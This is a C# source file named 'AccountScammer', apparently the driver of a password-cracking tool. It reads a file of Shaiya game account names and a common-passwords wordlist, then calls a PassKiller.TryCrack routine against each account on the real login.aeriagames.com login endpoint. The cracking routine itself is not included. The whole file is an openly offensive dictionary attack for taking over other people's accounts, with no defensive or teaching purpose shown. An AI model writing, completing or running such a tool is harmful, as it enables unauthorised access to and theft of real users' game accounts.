using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace AccountScammer {

	public class Program {
		public static List<string> Accounts = new List<string>();
		public static string[] Passwords; // less(er) memory usage on big lists
		public static string Website = "https://login.aeriagames.com";
		public static string WebsiteRefer = "https://login.aeriagames.com/user/login";


		public static void Main( string[] args ) {
			LoadAccounts();
			LoadPasswords();
			PassKiller.Initialize();

			for( int i = 0; i < Accounts.Count; i++ ) {
				string Password;
				Console.WriteLine( ( i + 1 ).ToString( "00" ) + ": " + Accounts[ i ] );
				PassKiller.TryCrack( Accounts[ i ], out Password );
			}

		}


		public static void LoadAccounts() {
			Accounts.AddRange( File.ReadAllLines( @"D:\Desktop\shaiya_accounts.txt" ) );
		}

		public static void LoadPasswords() {
			Passwords = File.ReadAllLines( @"D:\Desktop\C# Projects\Shaiya Tools\Account Scammer\AccountScammer\bin\Debug\Wordlists\common-passwords.txt" );
		}

	}

}
